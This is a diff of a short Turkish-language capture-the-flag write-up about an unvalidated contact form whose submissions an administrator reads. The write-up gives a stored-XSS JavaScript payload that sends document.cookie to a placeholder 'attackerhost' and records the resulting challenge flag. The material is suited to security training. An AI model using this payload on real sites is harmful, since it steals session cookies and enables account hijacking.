@@ -2,8 +2,10 @@
 
 Contact Form alanı Mevcut
 
-Herhangi Bir kontrol yapılmamakta 
+Herhangi Bir kontrol yapılmamakta ve gönderilen veriler bir yetkilinin önüne düşmekte. Xss ile cookie bilgisini alalım
 
         var xhr=new XMLHttpRequest(); 
         xhr.open("GET", "https://attackerhost/?"+document.cookie, true); 
         xhr.send();
+
+Kontorl altımızda olan bir sunucuya istek yaptırıldığında flagi görebiliriz. GOP{hellog_baby_its_my_xss_flag}
